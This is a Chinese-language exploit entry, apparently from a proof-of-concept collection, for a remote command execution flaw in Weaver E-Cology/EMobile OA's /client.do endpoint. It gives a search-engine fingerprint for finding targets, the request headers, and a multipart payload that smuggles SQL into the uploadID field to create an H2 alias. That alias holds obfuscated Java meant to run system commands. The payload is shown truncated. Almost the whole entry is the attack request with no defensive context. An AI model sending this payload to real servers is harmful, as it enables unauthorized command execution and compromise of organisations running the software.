# 泛微E-Cologyclient.doRCE漏洞

- **系统**：泛微OA　|　**类型**：命令执行　|　**CVE**：—
- **指纹**：`app="泛微-EMobile"`
- **请求**：`POST /client.do HTTP/1.1`
- **关键头**：`Host: 127.0.0.1`　`Content-Length: 0`　`Cookie: JSESSIONID=abcZRb929ZuHEdfjFEAMy`　`Content-Type: multipart/form-data; boundary=----HJGJjgvfIUGVYHVvfytfvkgvuy`　`Content-Length: 1151`

**请求体 / payload**
```
------HJGJjgvfIUGVYHVvfytfvkgvuy
Content-Disposition: form-data; name="method"
getupload
------HJGJjgvfIUGVYHVvfytfvkgvuy
Content-Disposition: form-data; name="uploadID"
1';CREATE ALIAS if not exists MzSNqKsZTagmf AS CONCAT('void e(String cmd) throws
java.la','ng.Exception{','Object curren','tRequest =
Thre','ad.currentT','hread().getConte','xtClass','Loader().loadC','lass("com.caucho.ser
ver.dispatch.ServletInvocation").getMet','hod("getContextRequest").inv','oke(null);java
.la','ng.reflect.Field _responseF =
currentRequest.getCl','ass().getSuperc','lass().getDeclar','edField("_response");_re…（脚本共 1117 字，完整版见原文）
```
- **预期**：200　|　system